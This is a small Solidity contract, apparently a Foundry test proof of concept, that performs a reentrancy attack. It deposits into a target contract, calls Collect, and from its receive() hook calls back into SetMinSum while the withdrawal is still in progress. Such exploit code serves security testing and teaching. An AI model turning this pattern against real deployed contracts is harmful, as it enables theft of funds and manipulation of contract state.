contract ReEntrantAttacker {
    C public target;
    uint256 public newMin;
    uint256 public collectAmount;

    constructor(C _target, uint256 _newMin) {
        target = _target;
        newMin = _newMin;
    }

    function attack(uint256 amt, uint256 lockTime) external payable {
        collectAmount = amt;
        target.Put{value: amt}(lockTime);
        // Donate extra to cover MinSum
        vm.deal(address(this), address(this).balance + amt);
        target.Collect(amt);
    }

    receive() external payable {
        // Re-enter: call SetMinSum while still inside Collect
        target.SetMinSum(newMin);
    }
}

